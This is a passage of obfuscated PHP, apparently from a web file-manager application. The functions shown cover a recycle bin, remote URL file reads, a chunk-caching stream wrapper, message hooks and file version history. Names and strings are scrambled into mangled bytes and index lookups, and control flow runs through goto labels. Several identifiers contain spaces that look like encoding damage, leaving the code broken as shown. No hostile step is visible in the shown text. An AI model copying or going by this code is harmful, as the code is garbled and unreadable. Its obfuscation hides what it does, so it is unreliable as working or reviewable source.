} if (!$½›’û‚Ğ->isParentOf($…¦È¤¹°, $êß«¯°§)) { continue; } $–ààáÃ = $½›’û‚Ğ->sourceInfo($êß«¯°§); if ($–ààáÃ[$Ç»·Â¥‘[410]] == $Ç»·Â¥‘[88]) { $ñ¾ğ˜‰´[] = array($Ç»·Â¥‘[580] => array($Ç»·Â¥‘[540], $–ààáÃ[$Ç»·Â¥‘[511]] . $êß«¯°§ . $Ç»·Â¥‘[541])); } else { $ñ¾ğ˜‰´[$Ç»·Â¥‘[402]][1][] = $êß«¯°§; } } if (!$ñ¾ğ˜‰´[$Ç»·Â¥‘[402]][1]) { unset($ñ¾ğ˜‰´[$Ç»·Â¥‘[402]]); } if (!$ñ¾ğ˜‰´) { return; } $ñ¾ğ˜‰´[$Ç»·Â¥‘[402]][1] = array_unique($ñ¾ğ˜‰´[$Ç»·Â¥‘[402]][1]); $ñ¾ğ˜‰´[$Ç»·Â¥‘[996]] = $Ç»·Â¥‘[1950]; $½›’û‚Ğ->where($ñ¾ğ˜‰´)->setField($Ç»·Â¥‘[431], 1); } private function recycleMove($ĞÔ©œ, $öÚŸêñï = 1) { $õ©òú§ì =& $_SERVER[­á Ş³Ö]; $½É ÏÙ = Model($õ©òú§ì[1335]); $íšˆü¬Œ = Model($õ©òú§ì[2166]); $üõÀÎÏÓ = array($õ©òú§ì[402] => $ĞÔ©œ); if ($öÚŸêñï) { $½É ÏÙ->where($üõÀÎÏÓ)->setField($õ©òú§ì[431], 1); $íšˆü¬Œ->eventRecycle($ĞÔ©œ, $õ©òú§ì[2167]); } else { $­ÛÚÏ‡Ú = $½É ÏÙ->where($üõÀÎÏÓ)->find(); $‡ï™• ü = $­ÛÚÏ‡Ú[$õ©òú§ì[410]] == $õ©òú§ì[88]; $ÛÓÈ¤­Ã = $½É ÏÙ->fileNameAuto($­ÛÚÏ‡Ú[$õ©òú§ì[432]], $­ÛÚÏ‡Ú[$õ©òú§ì[32]], REPEAT_RENAME_FOLDER, $‡ï™• ü); if ($ÛÓÈ¤­Ã != $­ÛÚÏ‡Ú[$õ©òú§ì[32]]) { $½É ÏÙ->rename($ĞÔ©œ, $ÛÓÈ¤­Ã); } $½É ÏÙ->where($üõÀÎÏÓ)->setField($õ©òú§ì[431], 0); $íšˆü¬Œ->eventRecycle($ĞÔ©œ, $õ©òú§ì[2168]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\x73\157\165\x72\143\145\123\145\x63\162\145\x74\x4c\151\x73\164"; public $field = array("\x73\x6f\x75\162\x63\145\x49\x44", "\x74\171\160\x65\111\x44", "\143\x72\145\141\x74\x65\125\163\145\162"); } goto c‘æÊ©©; b“ŠÂ¼¸: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($›¿òÔ§ = false) { } public function exist($©»§Òø†) { $ôŞÉ©‰‡ = $this->info($©»§Òø†); return $ôŞÉ©‰‡[$_SERVER[­á Ş³Ö][202]]; } public function isFile($£‚Ş•àÆ) { $—ËÓç = $this->info($£‚Ş•àÆ); return $—ËÓç[$_SERVER[­á Ş³Ö][202]]; } public function isFolder($¬®’–î‘) { return !1; } public function size($Öƒöõà‚) { $Êöâ«ì• = $this->info($Öƒöõà‚); return $Êöâ«ì•[$_SERVER[­á Ş³Ö][76]]; } public function info($Š°¥÷´Ş) { return $this->infoParse($Š°¥÷´Ş); } public function infoAuth($ğğ®§€ó) { return $this->infoParse($ğğ®§€ó); } public function infoWithChildren($®ïüºò’) { return $this->infoParse($®ïüºò’); } public function infoFull($¨ñª¿È£) { return $this->infoParse($¨ñª¿È£); } private function infoParse($É¦éâÁ) { $ÖˆÉ­¹Ø =& $_SERVER[­á Ş³Ö]; $Ø×ºÊ = $this->header($É¦éâÁ); if (!$Ø×ºÊ || !$Ø×ºÊ[$ÖˆÉ­¹Ø[746]]) { return !1; } $Õ‰†åÚ = _get($Ø×ºÊ, $ÖˆÉ­¹Ø[337], 0); $¹Ú´§ ” = array($ÖˆÉ­¹Ø[32] => $Ø×ºÊ[$ÖˆÉ­¹Ø[32]], $ÖˆÉ­¹Ø[84] => $É¦éâÁ, $ÖˆÉ­¹Ø[33] => $ÖˆÉ­¹Ø[200], $ÖˆÉ­¹Ø[76] => intval($Õ‰†åÚ), $ÖˆÉ­¹Ø[174] => get_path_ext($Ø×ºÊ[$ÖˆÉ­¹Ø[32]]), $ÖˆÉ­¹Ø[1386] => $Õ‰†åÚ > 0 && $Ø×ºÊ[$ÖˆÉ­¹Ø[1508]], $ÖˆÉ­¹Ø[1387] => !1); return $¹Ú´§ ”; } private function header($¿³Ò£Í) { $¬Ê“× – =& $_SERVER[­á Ş³Ö]; if (isset(self::$_cacheHeader[$¿³Ò£Í])) { return self::$_cacheHeader[$¿³Ò£Í]; } $£Î± ¤à = isset($GLOBALS[$¬Ê“× –[1509]]) ? $GLOBALS[$¬Ê“× –[1509]] : !1; $GLOBALS[$¬Ê“× –[1509]] = !0; self::$_cacheHeader[$¿³Ò£Í] = url_header($¿³Ò£Í); $GLOBALS[$¬Ê“× –[1509]] = $£Î± ¤à; return self::$_cacheHeader[$¿³Ò£Í]; } public function hashSimple($Èï•¥¦, $ˆ±Ö÷° = false) { $Š–Äì¢è =& $_SERVER[­á Ş³Ö]; $ÑÅ†î°Ú = $this->info($Èï•¥¦); if (!$ÑÅ†î°Ú || !$ÑÅ†î°Ú[$Š–Äì¢è[202]]) { return !1; } $ÅèÙ‡¨ˆ = $ÑÅ†î°Ú[$Š–Äì¢è[76]]; $ÌˆÀŒÄ = 200; $ŒËüä‚í = 50; if ($ÅèÙ‡¨ˆ <= $ÌˆÀŒÄ * $ŒËüä‚í) { return md5($this->fileSubstr($Èï•¥¦, 0, $ÅèÙ‡¨ˆ)) . $ÅèÙ‡¨ˆ; } $ÁÕ¼¼ò = intval($ÅèÙ‡¨ˆ / $ŒËüä‚í); $«ä¿Šæ¶ = $Š–Äì¢è[12]; $ƒ™—Ññ© = timeFloat(); $ËÂÅ¯¥Š = 15; for ($ãº¬Â¼Ô = 0; $ãº¬Â¼Ô < $ŒËüä‚í; $ãº¬Â¼Ô++) { if (timeFloat() - $ƒ™—Ññ© > $ËÂÅ¯¥Š) { return !1; } $‰íÎŒÓ‚ = $this->fileSubstr($Èï•¥¦, $ÁÕ¼¼ò * $ãº¬Â¼Ô, $ÌˆÀŒÄ); if (!$‰íÎŒÓ‚) { return !1; } $«ä¿Šæ¶ .= $‰íÎŒÓ‚; } $«ä¿Šæ¶ .= $this->fileSubstr($Èï•¥¦, $ÅèÙ‡¨ˆ - $ÌˆÀŒÄ, $ÌˆÀŒÄ); return md5($«ä¿Šæ¶) . $ÅèÙ‡¨ˆ; } public function getContent($Ä’–Â¦‚) { return $this->fileSubstr($Ä’–Â¦‚); } public function fileSubstr($ÇÂ‡Ù˜ß, $€æäö— = 0, $Ì‡¯¥Ÿš = -1) { $“æ‘Ô¬ =& $_SERVER[­á Ş³Ö]; $ÔÖ©ş¦ñ = $this->info($ÇÂ‡Ù˜ß); if (!$ÔÖ©ş¦ñ || !$ÔÖ©ş¦ñ[$“æ‘Ô¬[202]] && $ÔÖ©ş¦ñ[$“æ‘Ô¬[76]] > 1024 * 1024 * 10) { return !1; } if ($Ì‡¯¥Ÿš === -1) { $Ì‡¯¥Ÿš = $ÔÖ©ş¦ñ[$“æ‘Ô¬[76]]; } if ($Ì‡¯¥Ÿš == 0) { return $“æ‘Ô¬[12]; } $…ü–Ù®¶ = array($“æ‘Ô¬[1510] . $€æäö— . $“æ‘Ô¬[779] . ($€æäö— + $Ì‡¯¥Ÿš - 1)); $Í¹º˜ƒ¤ = url_request($ÇÂ‡Ù˜ß, $“æ‘Ô¬[230], !1, $…ü–Ù®¶, !1, !1, 30); return $Í¹º˜ƒ¤[$“æ‘Ô¬[1198]] ? $Í¹º˜ƒ¤[$“æ‘Ô¬[1198]] : $“æ‘Ô¬[12]; } public function download($âàœ½ü…, $Ç£Ëùğá) { Downloader::start($âàœ½ü…, $Ç£Ëùğá); return $Ç£Ëùğá; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ôš›˜„Ñ, $¤Èø®ÊÊ = '') { $this->info = $this->info($Ôš›˜„Ñ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[­á Ş³Ö][84]]; $this->pathOpen = $Ôš›˜„Ñ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ôš›˜„Ñ])) { self::$_chunkBuffer[$Ôš›˜„Ñ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Ò¥‚‹ç™) { $ıª”÷©Ã = $this->fileSubstr($this->pose, $Ò¥‚‹ç™); $this->pose += strlen($ıª”÷©Ã); return $ıª”÷©Ã; } public function stream_tell() { return $this->pose; } public function stream_seek($ĞÑëÃÍ, $š’œ¶É) { $ïåì¸“€ =& $_SERVER[­á Ş³Ö]; if ($š’œ¶É == SEEK_SET) { $this->pose = $ĞÑëÃÍ; } else { if ($š’œ¶É == SEEK_CUR) { $this->pose += $ĞÑëÃÍ; } else { if ($š’œ¶É == SEEK_END) { $this->pose = $this->info[$ïåì¸“€[76]] + intval($ĞÑëÃÍ); } } } if ($ĞÑëÃÍ < 0) { $this->pose = $this->info[$ïåì¸“€[76]] + $ĞÑëÃÍ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[­á Ş³Ö][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($´¹ù¹Ã‘, $¶ßŞŠüö) { $üØ¯º·Î =& $_SERVER[­á Ş³Ö]; $Ããíëææ = $this->info($´¹ù¹Ã‘); return array($üØ¯º·Î[1511] => 0, $üØ¯º·Î[1512] => 0, $üØ¯º·Î[16] => 32768 + 511, $üØ¯º·Î[1513] => 0, $üØ¯º·Î[1514] => 0, $üØ¯º·Î[1515] => 0, $üØ¯º·Î[1516] => 0, $üØ¯º·Î[76] => $Ããíëææ[$üØ¯º·Î[76]], $üØ¯º·Î[1517] => $Ããíëææ[$üØ¯º·Î[1385]], $üØ¯º·Î[1473] => $Ããíëææ[$üØ¯º·Î[85]], $üØ¯º·Î[1472] => $Ããíëææ[$üØ¯º·Î[201]], $üØ¯º·Î[1518] => 0, $üØ¯º·Î[1519] => 0); } static $fileInfo = array(); public function info($ğÎ¾“½ı) { $‘à‡·‡° = $_SERVER[­á Ş³Ö][1520]; if (isset(self::$fileInfo[$ğÎ¾“½ı])) { return self::$fileInfo[$ğÎ¾“½ı]; } if (substr($ğÎ¾“½ı, 0, strlen($‘à‡·‡°)) != $‘à‡·‡°) { return !1; } self::$fileInfo[$ğÎ¾“½ı] = IO::info(substr($ğÎ¾“½ı, strlen($‘à‡·‡°))); return self::$fileInfo[$ğÎ¾“½ı]; } public static function read($Ç¨»³¢, $Öğ™Á¬ó, $¦·ÏÖ¿·) { if (!isset(self::$_fopenCache[$Ç¨»³¢])) { $¢ïšõš = new StreamWrapperIO(); $¢ïšõš->stream_open($Ç¨»³¢); self::$_fopenCache[$Ç¨»³¢] = $¢ïšõš; } $¢ïšõš = self::$_fopenCache[$Ç¨»³¢]; return $¢ïšõš->fileSubstr($Öğ™Á¬ó, $¦·ÏÖ¿·); } public static function _read($»¥„òû, $“˜óş£, $´‡Ö†Â) { $‰Ó³½ûÈ =& $_SERVER[­á Ş³Ö]; $ğñûƒ›ß = fopen($»¥„òû, $‰Ó³½ûÈ[1389]); if (!$ğñûƒ›ß) { return $‰Ó³½ûÈ[12]; } $é–Æ­Ê› = 8192; fseek($ğñûƒ›ß, $“˜óş£, SEEK_SET); $úÑÁËÜ = $‰Ó³½ûÈ[12]; $ğËÓ„ñË = 0; while ($ğËÓ„ñË < $´‡Ö†Â) { $œ†Ô•ª = min($é–Æ­Ê›, $´‡Ö†Â - $ğËÓ„ñË); $úÑÁËÜ .= fread($ğñûƒ›ß, $œ†Ô•ª); $ğËÓ„ñË += $œ†Ô•ª; } fclose($ğñûƒ›ß); return $úÑÁËÜ; } public function fileSubstr($´¾ÚêŞ, $œÇ…±Ö) { $§¦õş¨µ =& $_SERVER[­á Ş³Ö]; $¡üŒÀ† = $this->info[$§¦õş¨µ[76]]; $¾õÕ­öé = $´¾ÚêŞ; $Á»ªÙÖì = $œÇ…±Ö; if ($´¾ÚêŞ < 0) { $´¾ÚêŞ = $¡üŒÀ† + $´¾ÚêŞ; } if ($œÇ…±Ö === !1) { $œÇ…±Ö = $¡üŒÀ† - $´¾ÚêŞ; } if ($´¾ÚêŞ + $œÇ…±Ö > $¡üŒÀ†) { $œÇ…±Ö = $¡üŒÀ† - $´¾ÚêŞ; } if ($œÇ…±Ö <= 0) { return $§¦õş¨µ[12]; } if ($´¾ÚêŞ < 0 || $´¾ÚêŞ >= $¡üŒÀ† || $œÇ…±Ö <= 0 || $œÇ…±Ö > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\151\154\145\x52\145\x61\144\x20\x65\x72\162\x6f\x72\x21\40\x73\164\x61\162\x74\75{$´¾ÚêŞ}\x3b\x6c\x65\x6e\147\x74\150\x3d{$œÇ…±Ö}\73\40\163\151\x7a\x65\75{$¡üŒÀ†}\x3b"); } $ŸÖ¯Ú·ú = 64 * 1024; $‘è˜Éæ =& self::$_chunkBuffer[$this->path]; if (!$‘è˜Éæ) { $‘è˜Éæ = array(); } $Äâ“ÔÕ— = 0; $«»ì·÷ = 0; $ıê‘—œ = $§¦õş¨µ[12]; foreach ($‘è˜Éæ as $Äâ“ÔÕ— => $ıê‘—œ) { $Äâ“ÔÕ— = intval($Äâ“ÔÕ—); $«»ì·÷ = $Äâ“ÔÕ— + strlen($ıê‘—œ); if ($´¾ÚêŞ >= $«»ì·÷) { continue; } if ($´¾ÚêŞ >= $Äâ“ÔÕ— && $´¾ÚêŞ + $œÇ…±Ö <= $«»ì·÷) { return substr($ıê‘—œ, $´¾ÚêŞ - $Äâ“ÔÕ—, $œÇ…±Ö); } break; } if (count($‘è˜Éæ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($§¦õş¨µ[1521], $§¦õş¨µ[1522] . count($‘è˜Éæ) . "\73\163\164\141\162\x74\75{$´¾ÚêŞ}\x2c\154\145\156\147\164\x68\75{$œÇ…±Ö}\73\160\157\163\145\x3a{$Äâ“ÔÕ—}\176{$«»ì·÷}"); throw new Exception($§¦õş¨µ[1523]); } $§óÙ¬ÈÉ = intval($´¾ÚêŞ / $ŸÖ¯Ú·ú) * $ŸÖ¯Ú·ú; $ï›ÑÌôò = ceil(($´¾ÚêŞ + $œÇ…±Ö) / $ŸÖ¯Ú·ú) * $ŸÖ¯Ú·ú - $§óÙ¬ÈÉ; $±ò·›™ = IO::fileSubstr($this->path, $§óÙ¬ÈÉ, $ï›ÑÌôò); $‘è˜Éæ[$§óÙ¬ÈÉ . $§¦õş¨µ[12]] = $±ò·›™; ksort($‘è˜Éæ); $ÔŸòş‹ = substr($±ò·›™, $´¾ÚêŞ - $§óÙ¬ÈÉ, $œÇ…±Ö); return $ÔŸòş‹; } private function log($™ŞÇòÙ“, $Ø„óÍÅÀ) { $ùÇ øü“ =& $_SERVER[­á Ş³Ö]; $²ëíŒÜº = timeFloat() - $this->timeStart; write_log(sprintf($ùÇ øü“[1524], $™ŞÇòÙ“, $this->info[$ùÇ øü“[32]], $²ëíŒÜº, $Ø„óÍÅÀ), $ùÇ øü“[1178]); } } class Message { function __construct() { } public function send($¾¼²ÂÈü = '', $áÔñ¹İ = array(), $¬äí›¬Æ = "\x74\x65\170\164") { $éËğÓ†„ =& $_SERVER[­á Ş³Ö]; $†ÏÅî‚â = array($éËğÓ†„[33] => $éËğÓ†„[1525], $éËğÓ†„[751] => $¾¼²ÂÈü); if (in_array($¬äí›¬Æ, array($éËğÓ†„[1525], $éËğÓ†„[1526]))) { $†ÏÅî‚â[$éËğÓ†„[33]] = $¬äí›¬Æ; } $áÔñ¹İ = array($éËğÓ†„[505] => isset($áÔñ¹İ[$éËğÓ†„[505]]) ? $áÔñ¹İ[$éËğÓ†„[505]] : $éËğÓ†„[12], $éËğÓ†„[590] => isset($áÔñ¹İ[$éËğÓ†„[590]]) ? $áÔñ¹İ[$éËğÓ†„[590]] : $éËğÓ†„[12]); if (empty($¾¼²ÂÈü) || empty($áÔñ¹İ[$éËğÓ†„[505]]) && empty($áÔñ¹İ[$éËğÓ†„[590]])) { return !1; } $¡‘›·Çª = array($éËğÓ†„[1466] => $†ÏÅî‚â, $éËğÓ†„[1527] => $áÔñ¹İ); Hook::trigger($éËğÓ†„[1528], $¡‘›·Çª); } } goto CÊ¡ƒ‡‰êİ; CãÉçÑ«ğğ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Œû®¹şˆ =& $_SERVER[­á Ş³Ö]; $¿ì–½¯ğ = $GLOBALS[$Œû®¹şˆ[6]][$Œû®¹şˆ[89]]; if ($¿ì–½¯ğ[$Œû®¹şˆ[1212]] != 1) { return; } if ($¿ì–½¯ğ[$Œû®¹şˆ[1213]] <= 0) { return; } if (isset($_REQUEST[$Œû®¹şˆ[1214]]) && $_REQUEST[$Œû®¹şˆ[1214]] == $Œû®¹şˆ[88]) { return; } Hook::bind($Œû®¹şˆ[1215], $Œû®¹şˆ[1216]); Hook::bind($Œû®¹şˆ[1217], $Œû®¹şˆ[1218]); Hook::bind($Œû®¹şˆ[1219], $Œû®¹şˆ[1220]); Hook::bind($Œû®¹şˆ[1221], $Œû®¹şˆ[1222]); Hook::bind($Œû®¹şˆ[1223], $Œû®¹şˆ[1224]); Hook::bind($Œû®¹şˆ[1225], $Œû®¹şˆ[1226]); } public static function eventBeforeUpload($“Ö¦ì»Ÿ) { if ($“Ö¦ì»Ÿ[3] && $“Ö¦ì»Ÿ[3] != REPEAT_REPLACE) { return; } $®çÎôÍ = self::parsePath($“Ö¦ì»Ÿ[0]); if (!$®çÎôÍ) { return; } self::add($®çÎôÍ); } public static function eventBeforeEdit($Şµ·€÷) { $Ô›ôéƒÄ = self::parsePath($Şµ·€÷[0]); if (!$Ô›ôéƒÄ) { return; } self::add($Ô›ôéƒÄ); } public static function eventBeforeCopyFile($À¦¥ÕÙş, $€¥äÉ™–, $Êó©Ó‹ä, $Öçñá¹, $®®æÓÌ£, $¼é™µäÎ) { $Ñ–ŠÍ¥¤ =& $_SERVER[­á Ş³Ö]; if (isset($Êó©Ó‹ä->_data[$Ñ–ŠÍ¥¤[1151]]) && $Êó©Ó‹ä->_data[$Ñ–ŠÍ¥¤[1151]]) { return; } $§ßü³¡­ = $Êó©Ó‹ä->getPathOuter($Öçñá¹); $Äœ¾“Õ” = self::parsePath($§ßü³¡­); if (!$Äœ¾“Õ”) { return; } self::add($Äœ¾“Õ”); } public static function eventBeforeRename($ÊÚ–¨è) { $ù»½•Ú =& $_SERVER[­á Ş³Ö]; $÷çöñ˜¶ = self::parsePath($ÊÚ–¨è[0]); if (!$÷çöñ˜¶) { return; } $á®†«Ï› = self::checkInHistory($÷çöñ˜¶); if (!$á®†«Ï›) { return; } if ($á®†«Ï›[$ù»½•Ú[33]] == $ù»½•Ú[200]) { $ÉãÏúˆª = self::listData($÷çöñ˜¶); if ($ÉãÏúˆª && $ÉãÏúˆª[$ù»½•Ú[369]]) { self::moveHistory($÷çöñ˜¶, $ÊÚ–¨è[1]); } } else { IO::rename($á®†«Ï›[$ù»½•Ú[84]], $ÊÚ–¨è[1]); } } public static function eventBeforeMove($ô¼ÕÛµ¸) { $ı’ğ«¤Ù =& $_SERVER[­á Ş³Ö]; $æşã‡Ò” = self::parsePath($ô¼ÕÛµ¸[0]); if (!$æşã‡Ò”) { return; } $§¹Š¢–¿ = self::parsePath($ô¼ÕÛµ¸[1]); if (!$§¹Š¢–¿) { return; } $Ğ­µÒó± = $ô¼ÕÛµ¸[3]; $ŸÑñêäö = self::checkInHistory($æşã‡Ò”); if (!$ŸÑñêäö) { return; } $ƒş°éõ = self::pathHistory($§¹Š¢–¿); if ($ŸÑñêäö[$ı’ğ«¤Ù[33]] == $ı’ğ«¤Ù[200]) { $¶ü¤¾‘ = self::listData($æşã‡Ò”); $íàúÆĞ = rtrim($§¹Š¢–¿, $ı’ğ«¤Ù[8]) . $ı’ğ«¤Ù[8] . ($Ğ­µÒó± ? $Ğ­µÒó± : get_path_this($æşã‡Ò”)); $Ê¾àã×¤ = self::listData($íàúÆĞ); if ($¶ü¤¾‘ && $¶ü¤¾‘[$ı’ğ«¤Ù[369]] && $Ê¾àã×¤ && $Ê¾àã×¤[$ı’ğ«¤Ù[369]]) { return self::clear($æşã‡Ò”); } if ($¶ü¤¾‘ && $¶ü¤¾‘[$ı’ğ«¤Ù[369]]) { self::moveHistory($æşã‡Ò”, $Ğ­µÒó±, $ƒş°éõ); } } else { IO::move($ŸÑñêäö[$ı’ğ«¤Ù[84]], $ƒş°éõ, !1, $Ğ­µÒó±); self::clearEmptyFolder(IO::pathFather($ŸÑñêäö[$ı’ğ«¤Ù[84]])); } } public static function eventAfterRemove($Íá×©‡Ğ, $à¬¼Â›) { $õÊ“ì”š =& $_SERVER[­á Ş³Ö]; if (!$à¬¼Â›) { return; } $Çƒçöà = self::parsePath($Íá×©‡Ğ[0]); if (!$Çƒçöà) { return; } $Œü›½çº = self::checkInHistory($Çƒçöà); if (!$Œü›½çº) { return; } if ($Œü›½çº[$õÊ“ì”š[33]] == $õÊ“ì”š[200]) { $ˆºœ¥’ = self::listData($Çƒçöà, !1); if ($ˆºœ¥’ && $ˆºœ¥’[$õÊ“ì”š[369]]) { self::clear($Çƒçöà, !1); } } else { IO::remove($Œü›½çº[$õÊ“ì”š[84]]); self::clearEmptyFolder(IO::pathFather($Œü›½çº[$õÊ“ì”š[84]])); } } private static function checkInHistory($ÍıÑ´·Û) { $ó½ÁåàË = self::pathHistory($ÍıÑ´·Û); if (!IO::exist($ó½ÁåàË)) { $ó½ÁåàË .= $_SERVER[­á Ş³Ö][1227]; } return IO::exist($ó½ÁåàË) ? IO::info($ó½ÁåàË) : !1; } private static function parsePath($ÖšÒÜ­è) { $¤ÜÜ…ÄÃ =& $_SERVER[­á Ş³Ö]; if (!$ÖšÒÜ­è) { return !1; } if ($GLOBALS[$¤ÜÜ…ÄÃ[1228]]) { return; } $¤şË»÷¼ = KodIO::parse($ÖšÒÜ­è); $¾Ñ„ºå‘ = $¤şË»÷¼[$¤ÜÜ…ÄÃ[33]]; $ïÍäÆ¾Ÿ = !$¾Ñ„ºå‘ || $¾Ñ„ºå‘ == KodIO::KOD_IO || $¾Ñ„ºå‘ == KodIO::KOD_SHARE_ITEM; if (!$ïÍäÆ¾Ÿ || !$¤şË»÷¼[$¤ÜÜ…ÄÃ[1229]]) { return !1; } if (substr($ÖšÒÜ­è, 0, strlen(DATA_PATH . $¤ÜÜ…ÄÃ[1230])) == DATA_PATH . $¤ÜÜ…ÄÃ[1230]) { return !1; } if ($¾Ñ„ºå‘ == KodIO::KOD_SHARE_ITEM) { $€ı¹›Œ  = IO::init($ÖšÒÜ­è); if ($€ı¹›Œ ->pathParse[$¤ÜÜ…ÄÃ[1147]]) { return self::parsePath($€ı¹›Œ ->pathParse[$¤ÜÜ…ÄÃ[1147]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $îÛœÔ¾Ğ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¤ÜÜ…ÄÃ[1231]); foreach ($îÛœÔ¾Ğ as $Äö°İ ã) { if (!$¾Ñ„ºå‘ && substr($ÖšÒÜ­è, 0, strlen($Äö°İ ã)) == $Äö°İ ã) { return !1; } } self::log($GLOBALS[$¤ÜÜ…ÄÃ[1142]] . $¤ÜÜ…ÄÃ[1232] . $ÖšÒÜ­è); return $ÖšÒÜ­è; } private static function pathHistory($†„“ÈÚ) { $ÕÖ®Œ¬ş =& $_SERVER[­á Ş³Ö]; $‡›½Ò¯Î = self::$_historyBase . ltrim(KodIO::clear($†„“ÈÚ), $ÕÖ®Œ¬ş[8]); $‡›½Ò¯Î = str_replace(array($ÕÖ®Œ¬ş[1233]), array($ÕÖ®Œ¬ş[1234]), $‡›½Ò¯Î); return $‡›½Ò¯Î; } public static function log($Ñ¡«‡ïÏ) { } public static function historyCount($ÜÂîé£Û) { $¸ô™€ºö =& $_SERVER[­á Ş³Ö]; $í×¦¨É‹ = array(); $§ÀÔ£ş = array(); foreach ($ÜÂîé£Û as $İ±èóÂ…) { $Ê§±˜ = get_path_father($İ±èóÂ…); if (!$§ÀÔ£ş[$Ê§±˜]) { $§ÀÔ£ş[$Ê§±˜] = array(); } $§ÀÔ£ş[$Ê§±˜][] = get_path_this($İ±èóÂ…); } foreach ($§ÀÔ£ş as $Ê§±˜ => $¨ŠÅ­) { $»–öÙ¼È = self::parsePath($Ê§±˜); if (!$»–öÙ¼È) { continue; } foreach ($¨ŠÅ­ as $áµÇšü€) { $Ôø¬äñÚ = self::listData(rtrim($»–öÙ¼È, $¸ô™€ºö[8]) . $¸ô™€ºö[8] . $áµÇšü€, !1); if ($Ôø¬äñÚ && $Ôø¬äñÚ[$¸ô™€ºö[369]]) { $í×¦¨É‹[rtrim($Ê§±˜, $¸ô™€ºö[8]) . $¸ô™€ºö[8] . $áµÇšü€] = count($Ôø¬äñÚ[$¸ô™€ºö[369]]); } } } return $í×¦¨É‹; } public static function add($¡õëæºĞ) { $¨ûÍÚÒâ =& $_SERVER[­á Ş³Ö]; $ÔŒ«Ï = self::listData($¡õëæºĞ); if (!$ÔŒ«Ï) { return; } $›Œé¹È‘ = Model($¨ûÍÚÒâ[767])->get($¨ûÍÚÒâ[1235]); $¥‘Ô‡æÂ = $GLOBALS[$¨ûÍÚÒâ[6]][$¨ûÍÚÒâ[89]][$¨ûÍÚÒâ[1213]]; $¬àº«Á‰ = $›Œé¹È‘ == $¨ûÍÚÒâ[1236] ? min(5, $¥‘Ô‡æÂ) : $¥‘Ô‡æÂ; if ($¥‘Ô‡æÂ <= 0) { return; } $ö¿úÇÈ = IO::info($¡õëæºĞ); $•µ¤’ = $ÔŒ«Ï[$¨ûÍÚÒâ[369]]; if ($ö¿úÇÈ[$¨ûÍÚÒâ[76]] == 0) { return; } if ($ö¿úÇÈ[$¨ûÍÚÒâ[76]] >= 1024 * 1024 * 500) { return !1; } $»©úÒñ = IO::hashSimple($¡õëæºĞ); if ($•µ¤’ && $•µ¤’[0][$¨ûÍÚÒâ[177]] == $»©úÒñ) { return !0; } if (array_key_exists($¨ûÍÚÒâ[203], $ö¿úÇÈ) && !$ö¿úÇÈ[$¨ûÍÚÒâ[203]]) { return !1; } $éŞßƒ‹² = short_id(time()); $¯Ì‰È„ò = array($¨ûÍÚÒâ[399] => $éŞßƒ‹², $¨ûÍÚÒâ[177] => $»©úÒñ, $¨ûÍÚÒâ[32] => $ö¿úÇÈ[$¨ûÍÚÒâ[32]] . $¨ûÍÚÒâ[10] . date($¨ûÍÚÒâ[1237]) . rand_string(1), $¨ûÍÚÒâ[76] => $ö¿úÇÈ[$¨ûÍÚÒâ[76]], $¨ûÍÚÒâ[454] => USER_ID, $¨ûÍÚÒâ[201] => time(), $¨ûÍÚÒâ[1238] => $¨ûÍÚÒâ[12]); IO::mkdir($ÔŒ«Ï[$¨ûÍÚÒâ[1239]]); $ŞŸÖë£ = IO::copy($¡õëæºĞ, $ÔŒ«Ï[$¨ûÍÚÒâ[1239]], !1, $¯Ì‰È„ò[$¨ûÍÚÒâ[32]]); if (!$ŞŸÖë£) { self::clearEmptyFolder($ÔŒ«Ï[$¨ûÍÚÒâ[1239]]); return !1; } array_unshift($•µ¤’, $¯Ì‰È„ò); if (count($•µ¤’) > $¬àº«Á‰) { $Ç¸ÛãÕÑ = array_slice($•µ¤’, $¬àº«Á‰); foreach ($Ç¸ÛãÕÑ as $°ŞãÏ¬´) { IO::remove($ÔŒ«Ï[$¨ûÍÚÒâ[1239]] . $°ŞãÏ¬´[$¨ûÍÚÒâ[32]]); } $•µ¤’ = array_slice($•µ¤’, 0, $¬àº«Á‰); } return self::saveData($ÔŒ«Ï[$¨ûÍÚÒâ[1240]], $•µ¤’); } public static function remove($Ï¥ãÙãı, $ö×ç·ã) { $ü¢÷£¹Í =& $_SERVER[­á Ş³Ö]; $ãÕñ‹– = self::listData($Ï¥ãÙãı); $Æ‰À†éï = array(); if (!$ãÕñ‹–) { return !1; } foreach ($ãÕñ‹–[$ü¢÷£¹Í[369]] as $’¯´ª±ù) { if ($’¯´ª±ù[$ü¢÷£¹Í[399]] == $ö×ç·ã) { IO::remove($ãÕñ‹–[$ü¢÷£¹Í[1239]] . $’¯´ª±ù[$ü¢÷£¹Í[32]]); continue; } $Æ‰À†éï[] = $’¯´ª±ù; } return self::saveData($ãÕñ‹–[$ü¢÷£¹Í[1240]], $Æ‰À†éï); } public static function clear($à‰å¿Âõ, $¯ú÷ªè = true) { $ã¸Â¯îû =& $_SERVER[­á Ş³Ö]; $¨×ÙĞĞ = self::listData($à‰å¿Âõ, $¯ú÷ªè); if (!$¨×ÙĞĞ) { return !1; } foreach ($¨×ÙĞĞ[$ã¸Â¯îû[369]] as $ª´¼›°±) { IO::remove($¨×ÙĞĞ[$ã¸Â¯îû[1239]] . $ª´¼›°±[$ã¸Â¯îû[32]]); } return self::saveData($¨×ÙĞĞ[$ã¸Â¯îû[1240]], array()); } public static function moveHistory($Öå‚àŞß, $ì §Õ™• = '', $¾ï®´¤â = '') { $é‡õîº =& $_SERVER[­á Ş³Ö]; $ò’¥Ä¸‰ = 